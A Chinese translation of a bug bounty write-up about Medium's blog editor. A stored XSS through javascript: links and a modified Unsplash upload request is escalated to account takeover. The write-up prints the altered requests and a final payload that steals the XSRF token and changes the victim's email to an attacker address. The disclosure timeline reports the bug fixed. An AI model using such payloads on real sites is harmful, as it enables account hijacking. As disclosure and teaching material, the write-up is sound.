***本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担**

 ****

![](https://image.3001.net/images/20190813/1565689734_5d5287861611e.png!small)

 **本文分享的是作者在博客平台Medium上编写文章时，偶然发现一个Stored XSS漏洞，在此基础上深入分析又发现了Account
Takeover账号劫持漏洞，完美实现赏金从$100到$1000的提升。**

## 偶然发现Stored XSS漏洞

几个星期以前的某个晚上，我正在Medium上写博客，内容无非就是 -为什么公司企业应该大力接纳漏洞众测模式...云云，一番吐槽宣泄之后，脑子短路突然不知道该写啥了。那就休息休息先干点别的吧，于是我就摆弄起Medium的博客编辑器来。

我不太记得当时我是怎么做的了，但是，我注意到可以从中添加类似于mailto:这样的特殊链接，所以，我脑子马上想起来，那既然能用mailto:样式，那能不能用javascript:呢？因此，我就用jAvAsCrIpT:confirm()来试了试。不敢相信，竟然可以的！我把它嵌入我的博客文章中，打开文章后点击对应链接，马上就跳出一个确认对话框来：

也就是说，我在Medium平台的关键位置发现了一个存储型XSS！立马上报之后我就睡觉去了。

## 不能就这样算了

第二天早上醒来，我想，能用5分钟发现一个存储型XSS漏洞，真的就只能如此了吗？接下来，在编写博客时，我就用Unsplash图片上传方式进行测试，并对此过程进行抓包，该POST请求如下：

    
    
    POST /p/8f2xxxxxxx/deltas?logLockId=970 HTTP/1.1
    
    Host: medium.com
    
    User-Agent: [Redacted]
    
    Accept: application/json
    
    Accept-Language: en-US,en;q=0.5
    
    Accept-Encoding: gzip, deflate
    
    Referer: https://medium.com/p/8f2xxxxxxx/edit
    
    X-Obvious-CID: web
    
    X-XSRF-Token: [Redacted]
    
    X-Client-Date: [Redacted]
    
    Content-Type: application/json
    
    Content-Length: 536
    
    Connection: close
    
    Cookie: [Redacted]
    
    {"id":"8f2xxxxxxx","deltas":[{"type":3,"index":1,"paragraph":{"name":"exxx","type":4,"text":"Photo by Some Author on Unsplash","markups":[{"type":3,"start":9,"end":17,"href":"https://medium.com/r/?url=https%3A%2F%2Funsplash.com%2F%40someauthor%3Futm_source%3Dmedium%26utm_medium%3Dreferral","title":"","rel":"photo-creator","anchorType":0},{"type":3,"start":21,"end":29,"href":"https://medium.com/r/?url=https%3A%2F%2Funsplash.com%2F%40someauthor%3Futm_source%3Dmedium%26utm_medium%3Dreferral","title":"","rel":"photo-source","anchorType":0}],"layout":1,"metadata":{"id":"0*xxxxxx","originalWidth":"\"alt='test'","originalHeight":5219,"alt":"","unsplashPhotoId":"xxxxx"}},"verifySameName":true}],"baseRev":28}

可以看到，其中存在X-XSRF-Token:
[Redacted]，以及超链接指定属性href，那把href其值替换成jAvAsCrIpT:confirm()试试看，替换后的请求如下:

    
    
    {"id":"8f2xxxxxxx","deltas":[{"type":3,"index":1,"paragraph":{"name":"exxx","type":4,"text":"Photo by Some Author on Unsplash","markups":[{"type":3,"start":9,"end":17,"href":"jAvAsCrIpT:confirm()","title":"","rel":"photo-creator","anchorType":0},{"type":3,"start":21,"end":29,"href":"jAvAsCrIpT:confirm()","title":"","rel":"photo-source","anchorType":0}],"layout":1,"metadata":{"id":"0*xxxxxx","originalWidth":"\"alt='test'","originalHeight":5219,"alt":"","unsplashPhotoId":"xxxxx"}},"verifySameName":true}],"baseRev":28}

哦靠，竟然又可以了！

现在这样，根据Medium赏金政策，顶多也就是$100美金，但其中提到：信息泄露或安全认证绕过漏洞可以达到$1000美金。所以我还是想搞个大的。

## 账户劫持

基于以上发现的编辑器存储型XSS，我想能不能测测账号劫持呢？由于请求交互过程中的会话Cookie具备HTTPonly设置，所以客户端脚本是不能正常读取Cookie内容的，当然也就无法窃取Cookie了，这就需要其它方法了。我来到个人资料选项设置中，看看能否把其中的注册邮箱地址更改替换成别人的邮箱，一试，竟然不需要密码就能更改。这种情况下，为了测试起见，我手动更改了其中的注册邮箱为我另一邮箱，然后往该邮箱发送了一条包含临时登录的URL链接，然后我在另一邮箱中打开该链接竟然能成功登录。整个过程可以用以下两步来实现：

> 1、用Stored XSS获得用户的CSRF token（该步骤中不可获取到Cookie）
>
> 2、向/me/email路径发送包含新邮箱的PUT请求

最终Payload如下：

    
    
    JaVaScRiPt:var x=window.__PRELOADED_STATE__.session.xsrf;var h = new XMLHttpRequest();h.open(‘PUT’, ‘/me/email’, true);h.setRequestHeader(‘Content-Type’, ‘application/json’);h.setRequestHeader(‘X-XSRF-Token’, x);h.send(‘{“email”:”attacker@malicious.com”}’);

## 漏洞上报进程

> 2019.7.10 XSS漏洞初报
>
> 2019.7.10 再次上报Unsplash图片上传XSS漏洞
>
> 2019.7.12 上报账户劫持漏洞
>
> 2019.7.13 Medium安全团队响应并奖励$1000美金
>
> 2019.8.3 漏洞修复
>
> 2019.8.6 我获得Medium名人堂[humans.txt致谢](https://medium.com/humans.txt)

 ***参考来源：[medium](https://medium.com/@reiss.r/writing-my-medium-blog-to-complete-account-takeover-e65d455c16b)，clouds编译整理，转载请注明来自FreeBuf.COM**

